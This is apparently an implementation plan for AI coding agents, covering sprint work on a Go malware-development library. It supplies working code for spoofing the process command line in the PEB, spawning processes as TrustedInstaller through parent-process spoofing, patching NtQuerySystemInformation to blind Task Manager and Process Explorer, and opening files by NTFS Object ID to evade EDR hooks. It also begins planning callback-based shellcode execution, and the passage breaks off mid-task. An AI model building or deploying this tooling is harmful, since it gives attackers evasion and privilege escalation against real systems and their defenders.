# Sprint 2 — Advanced Evasion & COM Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement Sprint 2 of the maldev roadmap: FakeCmdLine PEB overwrite, TrustedInstaller impersonation, HideProcess NtQSI patch, StealthOpen NTFS Object ID, 3 new inject callbacks, Task Scheduler COM rewrite, CLR hosting, and EnableAll token helper.

**Architecture:** 4 new packages (evasion/fakecmd, evasion/hideprocess, evasion/stealthopen, pe/clr) + 4 extensions/rewrites to existing packages (win/impersonate, inject/, persistence/scheduler, win/token). Every new package has `doc.go` with MITRE ATT&CK ID, detection level, and tests. All NT syscall paths accept optional `*wsyscall.Caller`.

**Tech Stack:** Go 1.21+, x/sys/windows, `win/api` DLL handles (single source of truth for all procs), `win/ntapi` for NT helpers, `github.com/go-ole/go-ole` v1.3.0 (already in go.mod) for COM.

---

## File Structure

```
evasion/fakecmd/
  doc.go                    MITRE T1036.005, package description
  fakecmd_windows.go        Spoof/Restore/Current via PEB overwrite
  fakecmd_stub.go           !windows stub (unsupported error)
  fakecmd_windows_test.go   TestSpoof, TestRestore, TestCurrentAfterSpoof

evasion/hideprocess/
  doc.go                    MITRE T1564.001
  hideprocess_windows.go    PatchProcessMonitor
  hideprocess_stub.go
  hideprocess_windows_test.go  TestPatchProcessMonitorInvalidPID

evasion/stealthopen/
  doc.go                    MITRE T1036
  stealthopen_windows.go    OpenByID, GetObjectID, SetObjectID
  stealthopen_stub.go
  stealthopen_windows_test.go  TestGetSetObjectID, TestOpenByID

pe/clr/
  doc.go                    MITRE T1620
  clr_windows.go            CLR COM vtable defs, Load, InstalledRuntimes, Runtime type
  clr_stub.go
  clr_windows_test.go       TestInstalledRuntimes, TestLoad

win/impersonate/impersonate_windows.go    ADD RunAsTrustedInstaller
inject/callback_windows.go               ADD 3 callbacks + String() cases
win/api/dll_windows.go                   ADD ReadDirectoryChangesW, NtNotifyChangeDirectoryFile, RtlRegisterWaitForSingleObject
persistence/scheduler/scheduler_windows.go  REWRITE with COM via go-ole (keep TaskMechanism)
persistence/scheduler/scheduler_test.go     UPDATE tests for new COM-based API
win/token/token_windows.go               ADD EnableAll(windows.Token) package-level func

docs/techniques/evasion/fakecmd.md
docs/techniques/evasion/hideprocess.md
docs/techniques/evasion/stealthopen.md
docs/techniques/pe/clr.md
```

---

## Context for all tasks

Module path: `github.com/oioio-space/maldev`

Project conventions (read CLAUDE.md for full details):
- `win/api` is the **single source of truth** for DLL handles — never create local `windows.NewLazySystemDLL` in a package; use `api.Kernel32.NewProc("Foo")` etc.
- `*wsyscall.Caller` is optional (nil = WinAPI fallback). When nil, use direct proc call. When non-nil, use `caller.Call("NtXxx", args...)`.
- Every exported package needs `doc.go` with: package doc, MITRE ATT&CK ID, Detection level, how-it-works one-liner, Example usage.
- `//go:build windows` on all Windows-specific files. Non-Windows stub in `*_stub.go` with `//go:build !windows`.
- Test files end in `_windows_test.go` (Windows-only) or `_test.go` (cross-platform).
- Commit after each task: `go build $(go list ./...)` must pass before committing.

Key imports available:
```go
import (
    "golang.org/x/sys/windows"
    "github.com/oioio-space/maldev/win/api"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
    "github.com/oioio-space/maldev/win/ntapi"
    "github.com/go-ole/go-ole"
)
```

---

## Task 1: FakeCmdLine — PEB CommandLine Overwrite

**MITRE:** T1036.005 — Masquerading: Match Legitimate Name or Location  
**Credit:** gtworek/PSBits FakeOwnCmdLine.c

**Files:**
- Create: `evasion/fakecmd/doc.go`
- Create: `evasion/fakecmd/fakecmd_stub.go`
- Create: `evasion/fakecmd/fakecmd_windows.go`
- Create: `evasion/fakecmd/fakecmd_windows_test.go`

- [ ] **Step 1: Write the failing test**

```go
// evasion/fakecmd/fakecmd_windows_test.go
//go:build windows

package fakecmd

import (
    "testing"

    "github.com/stretchr/testify/require"
)

func TestSpoofAndRestore(t *testing.T) {
    original := Current()

    err := Spoof("C:\\Windows\\System32\\svchost.exe -k netsvcs", nil)
    require.NoError(t, err)
    require.Equal(t, "C:\\Windows\\System32\\svchost.exe -k netsvcs", Current())

    err = Restore()
    require.NoError(t, err)
    require.Equal(t, original, Current())
}

func TestSpoofIdempotent(t *testing.T) {
    original := Current()
    defer Restore() //nolint:errcheck

    require.NoError(t, Spoof("fake1", nil))
    require.NoError(t, Spoof("fake2", nil)) // second call overwrites
    require.Equal(t, "fake2", Current())

    require.NoError(t, Restore())
    require.Equal(t, original, Current())
}
```

- [ ] **Step 2: Run test — expect compile failure**

```
go test ./evasion/fakecmd/... 2>&1
```
Expected: `undefined: Spoof`, `undefined: Restore`, `undefined: Current`

- [ ] **Step 3: Create the stub**

```go
// evasion/fakecmd/fakecmd_stub.go
//go:build !windows

package fakecmd

import "errors"

var errUnsupported = errors.New("fakecmd: not supported on this platform")

func Spoof(_ string, _ interface{}) error { return errUnsupported }
func Restore() error                       { return errUnsupported }
func Current() string                      { return "" }
```

- [ ] **Step 4: Create the Windows implementation**

```go
// evasion/fakecmd/fakecmd_windows.go
//go:build windows

package fakecmd

import (
    "fmt"
    "sync"
    "unsafe"

    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/win/api"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// unicodeString mirrors the UNICODE_STRING structure.
type unicodeString struct {
    Length        uint16
    MaximumLength uint16
    _             [4]byte // padding on x64
    Buffer        uintptr
}

// processBasicInformation mirrors PROCESS_BASIC_INFORMATION.
type processBasicInformation struct {
    ExitStatus                   uintptr
    PebBaseAddress               uintptr
    AffinityMask                 uintptr
    BasePriority                 uintptr
    UniqueProcessID              uintptr
    InheritedFromUniqueProcessID uintptr
}

// saved holds the original CommandLine so Restore() can revert it.
var (
    mu              sync.Mutex
    savedLength     uint16
    savedMaxLength  uint16
    savedBuffer     uintptr
    fakeBufferPins  [][]uint16 // prevent GC from collecting fake strings
)

// Spoof overwrites the current process PEB CommandLine with fakeCmd.
// Process Explorer, wmic, and Get-Process will reflect the new value.
// caller may be nil (falls back to direct NtQueryInformationProcess call).
func Spoof(fakeCmd string, caller *wsyscall.Caller) error {
    mu.Lock()
    defer mu.Unlock()

    cmdLine, err := getCmdLinePtr(caller)
    if err != nil {
        return err
    }

    // Save original on first call only.
    if savedBuffer == 0 {
        savedLength = cmdLine.Length
        savedMaxLength = cmdLine.MaximumLength
        savedBuffer = cmdLine.Buffer
    }

    // Build new UTF-16 buffer — must stay alive (pinned in fakeBufferPins).
    fakeW, err := windows.UTF16FromString(fakeCmd)
    if err != nil {
        return fmt.Errorf("encode fake command: %w", err)
    }
    fakeBufferPins = append(fakeBufferPins, fakeW)

    newLen := uint16((len(fakeW) - 1) * 2) // byte length excluding null terminator
    cmdLine.Length = newLen
    cmdLine.MaximumLength = newLen + 2
    cmdLine.Buffer = uintptr(unsafe.Pointer(&fakeW[0]))
    return nil
}

// Restore reverts the PEB CommandLine to the value saved before the first Spoof.
// No-op if Spoof was never called.
func Restore() error {
    mu.Lock()
    defer mu.Unlock()

    if savedBuffer == 0 {
        return nil
    }

    cmdLine, err := getCmdLinePtr(nil)
    if err != nil {
        return err
    }

    cmdLine.Length = savedLength
    cmdLine.MaximumLength = savedMaxLength
    cmdLine.Buffer = savedBuffer
    savedBuffer = 0
    fakeBufferPins = nil
    return nil
}

// Current reads the current PEB CommandLine as a Go string.
func Current() string {
    cmdLine, err := getCmdLinePtr(nil)
    if err != nil {
        return ""
    }
    if cmdLine.Buffer == 0 || cmdLine.Length == 0 {
        return ""
    }
    // Length is in bytes; convert to uint16 count.
    nChars := int(cmdLine.Length / 2)
    buf := (*[1 << 20]uint16)(unsafe.Pointer(cmdLine.Buffer))[:nChars:nChars]
    return windows.UTF16ToString(buf)
}

// getCmdLinePtr returns a pointer to the current process's UNICODE_STRING
// CommandLine field in RTL_USER_PROCESS_PARAMETERS.
func getCmdLinePtr(caller *wsyscall.Caller) (*unicodeString, error) {
    var pbi processBasicInformation
    size := uint32(unsafe.Sizeof(pbi))
    var returnLen uint32

    const ProcessBasicInformation = 0
    proc := windows.CurrentProcess()

    var status uintptr
    var err error
    if caller != nil {
        status, err = caller.Call("NtQueryInformationProcess",
            uintptr(proc),
            ProcessBasicInformation,
            uintptr(unsafe.Pointer(&pbi)),
            uintptr(size),
            uintptr(unsafe.Pointer(&returnLen)),
        )
    } else {
        status, _, err = api.ProcNtQueryInformationProcess.Call(
            uintptr(proc),
            ProcessBasicInformation,
            uintptr(unsafe.Pointer(&pbi)),
            uintptr(size),
            uintptr(unsafe.Pointer(&returnLen)),
        )
    }
    if status != 0 {
        return nil, fmt.Errorf("NtQueryInformationProcess: status 0x%X: %w", status, err)
    }

    // PEB.ProcessParameters is at offset 0x20 on x64.
    ppAddr := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x20))
    if ppAddr == 0 {
        return nil, fmt.Errorf("ProcessParameters pointer is nil")
    }

    // RTL_USER_PROCESS_PARAMETERS.CommandLine is at offset 0x70 on x64.
    return (*unicodeString)(unsafe.Pointer(ppAddr + 0x70)), nil
}
```

- [ ] **Step 5: Create doc.go**

```go
// evasion/fakecmd/doc.go

// Package fakecmd overwrites the current process PEB CommandLine string so
// that process-listing tools (Process Explorer, wmic, Get-Process) display a
// fake command line rather than the real one.
//
// Technique: PEB.ProcessParameters.CommandLine in-place overwrite.
// MITRE ATT&CK: T1036.005 — Masquerading: Match Legitimate Name or Location
// Detection: Low (in-memory only; not reflected in kernel process object)
//
// Example:
//
//	if err := fakecmd.Spoof(`C:\Windows\System32\svchost.exe -k netsvcs`, nil); err != nil {
//	    log.Fatal(err)
//	}
//	defer fakecmd.Restore()
package fakecmd
```

- [ ] **Step 6: Run tests**

```
go test ./evasion/fakecmd/... -v -count=1
```
Expected: `PASS` for both tests.

- [ ] **Step 7: Verify build**

```
go build $(go list ./...)
```

- [ ] **Step 8: Commit**

```bash
git add evasion/fakecmd/
git commit -m "feat(fakecmd): PEB CommandLine overwrite — T1036.005"
```

---

## Task 2: EnableAll — Package-level token helper

**Note:** `(*Token).EnableAllPrivileges()` METHOD already exists. This task adds a package-level convenience function `EnableAll(windows.Token) error` for callers who have a raw handle.

**Files:**
- Modify: `win/token/token_windows.go`
- Modify: `win/token/token_test.go`

- [ ] **Step 1: Write the failing test**

Add to `win/token/token_test.go`:

```go
func TestEnableAll(t *testing.T) {
    if !windows.GetCurrentProcessToken().IsElevated() {
        t.Skip("requires elevation")
    }
    // EnableAll on current process token should not error.
    err := EnableAll(windows.GetCurrentProcessToken())
    require.NoError(t, err)
}
```

- [ ] **Step 2: Run test — expect compile failure**

```
go test ./win/token/... 2>&1
```
Expected: `undefined: EnableAll`

- [ ] **Step 3: Add EnableAll to token_windows.go**

Add after the `OpenProcessToken` function:

```go
// EnableAll enables every privilege present in the given token handle.
// Convenience wrapper for callers who hold a raw windows.Token rather than a *Token.
func EnableAll(t windows.Token) error {
    tok := New(t, Primary)
    // Do not close — we do not own this handle.
    return tok.EnableAllPrivileges()
}
```

- [ ] **Step 4: Run tests**

```
go test ./win/token/... -v -count=1
```
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add win/token/token_windows.go win/token/token_test.go
git commit -m "feat(token): add EnableAll(windows.Token) package-level helper"
```

---

## Task 3: TrustedInstaller — spawn process as TI

**MITRE:** T1134.001 — Token Impersonation  
**Files:**
- Modify: `win/impersonate/impersonate_windows.go`
- Modify: `win/impersonate/impersonate_test.go`

**Important:** `win/impersonate` is Layer 1. It cannot import `c2/shell` (Layer 3). The PPID spoofing logic is replicated inline using `windows.OpenProcess` + `syscall.SysProcAttr.ParentProcess`.

- [ ] **Step 1: Write the failing test**

Add to `win/impersonate/impersonate_test.go`:

```go
func TestRunAsTrustedInstallerNotElevated(t *testing.T) {
    if !windows.GetCurrentProcessToken().IsElevated() {
        // Without elevation, starting TI service fails — verify we get a useful error.
        _, err := RunAsTrustedInstaller("cmd.exe")
        require.Error(t, err)
        return
    }
    t.Skip("elevated: full TI test requires VM — skipping in unit test")
}
```

- [ ] **Step 2: Run test — expect compile failure**

```
go test ./win/impersonate/... 2>&1
```
Expected: `undefined: RunAsTrustedInstaller`

- [ ] **Step 3: Add required imports and proc vars**

At the top of `win/impersonate/impersonate_windows.go`, the import block currently has `win/api` and `win/token`. Add `"os/exec"` and `"syscall"` to the import block.

Add proc vars after the existing package-level vars:

```go
var (
    procOpenSCManagerW    = api.Advapi32.NewProc("OpenSCManagerW")
    procOpenServiceW      = api.Advapi32.NewProc("OpenServiceW")
    procStartServiceW     = api.Advapi32.NewProc("StartServiceW")
    procQueryServiceStatusEx = api.Advapi32.NewProc("QueryServiceStatusEx")
    procCloseServiceHandle = api.Advapi32.NewProc("CloseServiceHandle")
)

const (
    scManagerConnect     = 0x0001
    serviceQueryStatus   = 0x0004
    serviceStart         = 0x0010
    serviceRunning       = 0x00000004
    scStatusProcessInfo  = 0
)

// serviceStatusProcess mirrors SERVICE_STATUS_PROCESS.
type serviceStatusProcess struct {
    ServiceType             uint32
    CurrentState            uint32
    ControlsAccepted        uint32
    Win32ExitCode           uint32
    ServiceSpecificExitCode uint32
    CheckPoint              uint32
    WaitHint                uint32
    ProcessID               uint32
    ServiceFlags            uint32
}
```

- [ ] **Step 4: Implement RunAsTrustedInstaller**

Add at the end of `win/impersonate/impersonate_windows.go`:

```go
// RunAsTrustedInstaller spawns cmd with args as a child of the TrustedInstaller
// service process (NT SERVICE\TrustedInstaller), giving it TI-level token.
// Requires admin + SeDebugPrivilege.
//
// The returned *exec.Cmd has already been started. The caller is responsible
// for calling Wait() on it.
func RunAsTrustedInstaller(cmd string, args ...string) (*exec.Cmd, error) {
    tiPID, err := startAndFindTI()
    if err != nil {
        return nil, err
    }

    parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, tiPID)
    if err != nil {
        return nil, fmt.Errorf("open TrustedInstaller process: %w", err)
    }
    defer windows.CloseHandle(parentHandle)

    c := exec.Command(cmd, args...)
    c.SysProcAttr = &syscall.SysProcAttr{
        HideWindow:    true,
        ParentProcess: syscall.Handle(parentHandle),
    }

    if err := c.Start(); err != nil {
        return nil, fmt.Errorf("start command: %w", err)
    }
    return c, nil
}

// startAndFindTI ensures the TrustedInstaller service is running and returns its PID.
func startAndFindTI() (uint32, error) {
    scName, _ := windows.UTF16PtrFromString("TrustedInstaller")
    managerName, _ := windows.UTF16PtrFromString("")

    hSCM, _, err := procOpenSCManagerW.Call(
        uintptr(unsafe.Pointer(managerName)),
        0,
        uintptr(scManagerConnect),
    )
    if hSCM == 0 {
        return 0, fmt.Errorf("OpenSCManager: %w", err)
    }
    defer procCloseServiceHandle.Call(hSCM) //nolint:errcheck

    hSvc, _, err := procOpenServiceW.Call(
        hSCM,
        uintptr(unsafe.Pointer(scName)),
        uintptr(serviceQueryStatus|serviceStart),
    )
    if hSvc == 0 {
        return 0, fmt.Errorf("OpenService(TrustedInstaller): %w", err)
    }
    defer procCloseServiceHandle.Call(hSvc) //nolint:errcheck

    // Start the service (idempotent — fails harmlessly if already running).
    procStartServiceW.Call(hSvc, 0, 0) //nolint:errcheck

    // Query PID.
    var ssp serviceStatusProcess
    needed := uint32(unsafe.Sizeof(ssp))
    r, _, err := procQueryServiceStatusEx.Call(
        hSvc,
        uintptr(scStatusProcessInfo),
        uintptr(unsafe.Pointer(&ssp)),
        uintptr(needed),
        uintptr(unsafe.Pointer(&needed)),
    )
    if r == 0 {
        return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
    }
    if ssp.CurrentState != serviceRunning {
        return 0, fmt.Errorf("TrustedInstaller service not running (state=%d)", ssp.CurrentState)
    }
    return ssp.ProcessID, nil
}
```

- [ ] **Step 5: Add missing imports**

Ensure the import block in `impersonate_windows.go` includes:
```go
import (
    "fmt"
    "os/exec"
    "runtime"
    "syscall"
    "unsafe"

    "golang.org/x/sync/errgroup"
    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/win/api"
    "github.com/oioio-space/maldev/win/token"
)
```

- [ ] **Step 6: Run tests**

```
go test ./win/impersonate/... -v -count=1
```
Expected: `TestRunAsTrustedInstallerNotElevated` PASS (either error or skip).

- [ ] **Step 7: Build check**

```
go build $(go list ./...)
```

- [ ] **Step 8: Commit**

```bash
git add win/impersonate/
git commit -m "feat(impersonate): RunAsTrustedInstaller — spawn as NT SERVICE\\TrustedInstaller"
```

---

## Task 4: HideProcess — patch NtQSI in target process

**MITRE:** T1564.001 — Hide Artifacts: Hidden Process  
**Credit:** S3cur3Th1sSh1t/Creds

**Files:**
- Create: `evasion/hideprocess/doc.go`
- Create: `evasion/hideprocess/hideprocess_stub.go`
- Create: `evasion/hideprocess/hideprocess_windows.go`
- Create: `evasion/hideprocess/hideprocess_windows_test.go`

**Implementation note:** The patch writes `mov eax, STATUS_NOT_IMPLEMENTED; ret` to the start of NtQuerySystemInformation in the target's ntdll. The 6-byte shellcode: `{0xB8, 0x02, 0x00, 0x00, 0xC0, 0xC3}` (`mov eax, 0xC0000002; ret`). Finding ntdll base in the remote process uses `win/ntapi.EnumSystemHandles` approach — but it's simpler to load ntdll locally (same base address across all processes on the same system since Win8 ASLR) and use that offset.

- [ ] **Step 1: Write the failing test**

```go
// evasion/hideprocess/hideprocess_windows_test.go
//go:build windows

package hideprocess

import (
    "testing"

    "github.com/stretchr/testify/require"
)

func TestPatchProcessMonitorInvalidPID(t *testing.T) {
    // PID 0 never exists — expect an error from OpenProcess.
    err := PatchProcessMonitor(0, nil)
    require.Error(t, err)
}
```

- [ ] **Step 2: Run — expect compile failure**

```
go test ./evasion/hideprocess/... 2>&1
```

- [ ] **Step 3: Create stub**

```go
// evasion/hideprocess/hideprocess_stub.go
//go:build !windows

package hideprocess

import "errors"

func PatchProcessMonitor(_ int, _ interface{}) error {
    return errors.New("hideprocess: not supported on this platform")
}
```

- [ ] **Step 4: Create Windows implementation**

```go
// evasion/hideprocess/hideprocess_windows.go
//go:build windows

package hideprocess

import (
    "fmt"
    "unsafe"

    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/win/api"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// nqsiPatch overwrites the first bytes of NtQuerySystemInformation with
// "mov eax, STATUS_NOT_IMPLEMENTED (0xC0000002); ret".
// The patched process can no longer enumerate processes via this API.
var nqsiPatch = []byte{0xB8, 0x02, 0x00, 0x00, 0xC0, 0xC3}

// PatchProcessMonitor patches NtQuerySystemInformation in the target process
// so it always returns STATUS_NOT_IMPLEMENTED, blinding process monitors like
// Task Manager and Process Explorer that run as that process.
// caller may be nil (falls back to WinAPI VirtualProtectEx + WriteProcessMemory).
func PatchProcessMonitor(pid int, caller *wsyscall.Caller) error {
    hProc, err := windows.OpenProcess(
        windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|windows.PROCESS_QUERY_INFORMATION,
        false,
        uint32(pid),
    )
    if err != nil {
        return fmt.Errorf("OpenProcess(%d): %w", pid, err)
    }
    defer windows.CloseHandle(hProc)

    // NtQuerySystemInformation has the same address in every process on Win8+
    // because ntdll.dll is shared (ASLR randomises base only per-boot).
    target := api.ProcNtQuerySystemInformation.Addr()
    if target == 0 {
        if err := api.ProcNtQuerySystemInformation.Find(); err != nil {
            return fmt.Errorf("resolve NtQuerySystemInformation: %w", err)
        }
        target = api.ProcNtQuerySystemInformation.Addr()
    }

    return remoteWrite(hProc, target, nqsiPatch, caller)
}

// remoteWrite changes protection on addr in hProc to RWX, writes patch, then restores.
func remoteWrite(hProc windows.Handle, addr uintptr, patch []byte, caller *wsyscall.Caller) error {
    size := uintptr(len(patch))
    var oldProtect uint32

    if caller != nil {
        r, err := caller.Call("NtWriteVirtualMemory",
            uintptr(hProc),
            addr,
            uintptr(unsafe.Pointer(&patch[0])),
            uintptr(len(patch)),
            0,
        )
        if r != 0 {
            return fmt.Errorf("NtWriteVirtualMemory: NTSTATUS 0x%X: %w", r, err)
        }
        return nil
    }

    // WinAPI fallback: VirtualProtectEx + WriteProcessMemory.
    if err := windows.VirtualProtectEx(hProc, addr, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
        return fmt.Errorf("VirtualProtectEx: %w", err)
    }

    var written uintptr
    if err := windows.WriteProcessMemory(hProc, addr, &patch[0], size, &written); err != nil {
        return fmt.Errorf("WriteProcessMemory: %w", err)
    }

    var dummy uint32
    windows.VirtualProtectEx(hProc, addr, size, oldProtect, &dummy) //nolint:errcheck
    return nil
}
```

- [ ] **Step 5: Create doc.go**

```go
// evasion/hideprocess/doc.go

// Package hideprocess patches NtQuerySystemInformation in a target process
// so it returns STATUS_NOT_IMPLEMENTED, blinding that process's ability to
// enumerate running processes. Typically applied to taskmgr.exe or procexp.exe.
//
// MITRE ATT&CK: T1564.001 — Hide Artifacts: Hidden Process
// Detection: Medium (memory write to ntdll detectable via integrity checks)
//
// Example:
//
//	// Blind Task Manager (run as admin + SeDebugPrivilege)
//	pid := process.FindByName("Taskmgr.exe")[0].PID
//	hideprocess.PatchProcessMonitor(int(pid), nil)
package hideprocess
```

- [ ] **Step 6: Run tests and build**

```
go test ./evasion/hideprocess/... -v -count=1
go build $(go list ./...)
```

- [ ] **Step 7: Commit**

```bash
git add evasion/hideprocess/
git commit -m "feat(hideprocess): patch NtQSI in target process — T1564.001"
```

---

## Task 5: StealthOpen — NTFS Object ID file access

**MITRE:** T1036 — Masquerading  
**Credit:** gtworek/PSBits StealthOpen.c

**Files:**
- Create: `evasion/stealthopen/doc.go`
- Create: `evasion/stealthopen/stealthopen_stub.go`
- Create: `evasion/stealthopen/stealthopen_windows.go`
- Create: `evasion/stealthopen/stealthopen_windows_test.go`

**API:** `GetObjectID` (FSCTL_GET_OBJECT_ID), `SetObjectID` (FSCTL_SET_OBJECT_ID), `OpenByID` (Win32 `OpenFileById` with ObjectIdType).

**Implementation note:**
- `FSCTL_GET_OBJECT_ID` = `0x9009C`, `FSCTL_SET_OBJECT_ID` = `0x900A4`
- `OpenFileById` is in kernel32.dll. `FILE_ID_DESCRIPTOR.Type` = 1 for ObjectId.
- `FILE_OBJECTID_BUFFER` is 64 bytes: 16-byte ObjectId + 48 bytes birth info.
- `OpenFileById` needs a handle to the volume (obtained by opening `\\.\C:` etc., where volume is extracted from the full path).

- [ ] **Step 1: Write the failing test**

```go
// evasion/stealthopen/stealthopen_windows_test.go
//go:build windows

package stealthopen

import (
    "os"
    "path/filepath"
    "testing"

    "github.com/stretchr/testify/require"
)

func TestGetAndOpenByID(t *testing.T) {
    // Create a temp file.
    f, err := os.CreateTemp("", "stealthopen-*.txt")
    require.NoError(t, err)
    _, _ = f.WriteString("hello stealthopen")
    f.Close()
    defer os.Remove(f.Name())

    // Get its Object ID (auto-creates one if absent).
    oid, err := GetObjectID(f.Name())
    require.NoError(t, err)
    require.NotEqual(t, [16]byte{}, oid)

    // Re-open by Object ID and verify content.
    volume := filepath.VolumeName(f.Name()) + "\\"
    fh, err := OpenByID(volume, oid)
    require.NoError(t, err)
    defer fh.Close()

    buf := make([]byte, 17)
    n, err := fh.Read(buf)
    require.NoError(t, err)
    require.Equal(t, "hello stealthopen", string(buf[:n]))
}

func TestSetObjectID(t *testing.T) {
    f, err := os.CreateTemp("", "stealthopen-set-*.txt")
    require.NoError(t, err)
    f.Close()
    defer os.Remove(f.Name())

    // Must be admin to set object IDs.
    var want [16]byte
    for i := range want {
        want[i] = byte(i + 1)
    }
    err = SetObjectID(f.Name(), want)
    if err != nil {
        t.Skipf("SetObjectID requires admin: %v", err)
    }

    got, err := GetObjectID(f.Name())
    require.NoError(t, err)
    require.Equal(t, want, got)
}
```

- [ ] **Step 2: Run — expect compile failure**

```
go test ./evasion/stealthopen/... 2>&1
```

- [ ] **Step 3: Create stub**

```go
// evasion/stealthopen/stealthopen_stub.go
//go:build !windows

package stealthopen

import (
    "errors"
    "os"
)

var errUnsupported = errors.New("stealthopen: not supported on this platform")

func GetObjectID(_ string) ([16]byte, error)                  { return [16]byte{}, errUnsupported }
func SetObjectID(_ string, _ [16]byte) error                   { return errUnsupported }
func OpenByID(_ string, _ [16]byte) (*os.File, error)          { return nil, errUnsupported }
```

- [ ] **Step 4: Create Windows implementation**

```go
// evasion/stealthopen/stealthopen_windows.go
//go:build windows

package stealthopen

import (
    "fmt"
    "os"
    "unsafe"

    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/win/api"
)

const (
    fsctlGetObjectID           = 0x9009C
    fsctlSetObjectID           = 0x900A4
    fsctlCreateOrGetObjectID   = 0x900C0
    fileShareAll               = windows.FILE_SHARE_READ | windows.FILE_SHARE_WRITE | windows.FILE_SHARE_DELETE
)

// fileObjectIDBuf mirrors FILE_OBJECTID_BUFFER (64 bytes).
type fileObjectIDBuf struct {
    ObjectID       [16]byte
    BirthVolumeID  [16]byte
    BirthObjectID  [16]byte
    DomainID       [16]byte
}

// fileIDDescriptor mirrors FILE_ID_DESCRIPTOR for ObjectId type.
type fileIDDescriptor struct {
    DwSize   uint32
    IDType   uint32  // 1 = ObjectIdType
    ObjectID [16]byte
    _        [4]byte // padding — union is 16 bytes, LARGE_INTEGER also 8 → use 16 here
}

var procOpenFileById = api.Kernel32.NewProc("OpenFileById")

// GetObjectID returns the NTFS Object ID of a file, creating one if absent.
func GetObjectID(path string) ([16]byte, error) {
    h, err := openForFsctl(path)
    if err != nil {
        return [16]byte{}, err
    }
    defer windows.CloseHandle(h)

    var buf fileObjectIDBuf
    var returned uint32
    err = windows.DeviceIoControl(h,
        fsctlCreateOrGetObjectID,
        nil, 0,
        (*byte)(unsafe.Pointer(&buf)), uint32(unsafe.Sizeof(buf)),
        &returned, nil,
    )
    if err != nil {
        return [16]byte{}, fmt.Errorf("FSCTL_CREATE_OR_GET_OBJECT_ID: %w", err)
    }
    return buf.ObjectID, nil
}

// SetObjectID assigns a specific NTFS Object ID to a file. Requires admin.
func SetObjectID(path string, objectID [16]byte) error {
    h, err := openForFsctl(path)
    if err != nil {
        return err
    }
    defer windows.CloseHandle(h)

    buf := fileObjectIDBuf{ObjectID: objectID}
    var returned uint32
    return windows.DeviceIoControl(h,
        fsctlSetObjectID,
        (*byte)(unsafe.Pointer(&buf)), uint32(unsafe.Sizeof(buf)),
        nil, 0,
        &returned, nil,
    )
}

// OpenByID opens a file using its NTFS Object ID (bypasses path-based EDR hooks).
// volumePath is the volume root, e.g. "C:\".
func OpenByID(volumePath string, objectID [16]byte) (*os.File, error) {
    volPath, err := windows.UTF16PtrFromString(volumePath)
    if err != nil {
        return nil, fmt.Errorf("encode volume path: %w", err)
    }

    hVol, err := windows.CreateFile(
        volPath,
        windows.GENERIC_READ,
        fileShareAll,
        nil,
        windows.OPEN_EXISTING,
        windows.FILE_FLAG_BACKUP_SEMANTICS,
        0,
    )
    if err != nil {
        return nil, fmt.Errorf("open volume %s: %w", volumePath, err)
    }
    defer windows.CloseHandle(hVol)

    desc := fileIDDescriptor{
        DwSize:   uint32(unsafe.Sizeof(fileIDDescriptor{})),
        IDType:   1, // ObjectIdType
        ObjectID: objectID,
    }

    h, _, callErr := procOpenFileById.Call(
        uintptr(hVol),
        uintptr(unsafe.Pointer(&desc)),
        uintptr(windows.GENERIC_READ),
        uintptr(fileShareAll),
        0,
        uintptr(windows.FILE_FLAG_BACKUP_SEMANTICS),
    )
    if h == uintptr(windows.InvalidHandle) {
        return nil, fmt.Errorf("OpenFileById: %w", callErr)
    }

    return os.NewFile(uintptr(h), "objectid"), nil
}

func openForFsctl(path string) (windows.Handle, error) {
    p, err := windows.UTF16PtrFromString(path)
    if err != nil {
        return 0, fmt.Errorf("encode path: %w", err)
    }
    return windows.CreateFile(
        p,
        windows.FILE_READ_ATTRIBUTES|windows.FILE_WRITE_ATTRIBUTES,
        fileShareAll,
        nil,
        windows.OPEN_EXISTING,
        windows.FILE_FLAG_BACKUP_SEMANTICS,
        0,
    )
}
```

- [ ] **Step 5: Create doc.go**

```go
// evasion/stealthopen/doc.go

// Package stealthopen opens files by their NTFS Object ID (a 128-bit GUID
// stored in the MFT) rather than by path, bypassing path-based EDR hooks on
// NtCreateFile / CreateFile.
//
// MITRE ATT&CK: T1036 — Masquerading
// Detection: Low (Object ID access not logged by most EDR path filters)
//
// Example:
//
//	oid, _ := stealthopen.GetObjectID(`C:\payload.bin`)
//	f, _ := stealthopen.OpenByID(`C:\`, oid)
//	defer f.Close()
package stealthopen
```

- [ ] **Step 6: Run tests and build**

```
go test ./evasion/stealthopen/... -v -count=1
go build $(go list ./...)
```

- [ ] **Step 7: Commit**

```bash
git add evasion/stealthopen/
git commit -m "feat(stealthopen): open files by NTFS Object ID — T1036"
```

---

## Task 6: New Callback Execution Methods

**Credit:** OsandaMalith/CallbackShellcode  
**Files:**
- Modify: `win/api/dll_windows.go` — add 3 procs
- Modify: `inject/callback_windows.go` — add 3 methods + String() cases
- Modify: `inject/callback_test.go` — add 3 test cases

- [ ] **Step 1: Add proc vars to win/api/dll_windows.go**

In the `// kernel32.dll procs` block add:
```go
ProcReadDirectoryChangesW = Kernel32.NewProc("ReadDirectoryChangesW")
ProcRtlRegisterWait       = Ntdll.NewProc("RtlRegisterWait")
```

In the `// ntdll.dll procs` block add:
```go
ProcNtNotifyChangeDirectoryFile = Ntdll.NewProc("NtNotifyChangeDirectoryFile")
```

- [ ] **Step 2: Write the failing tests**

Add to `inject/callback_test.go`:

```go
func TestExecuteCallbackReadDirectoryChanges(t *testing.T) {
    testutil.RequireAdmin(t)
    sc := allocate(t)
    defer windows.VirtualFree(sc, 0, windows.MEM_RELEASE)
    require.NoError(t, ExecuteCallback(sc, CallbackReadDirectoryChanges))
}

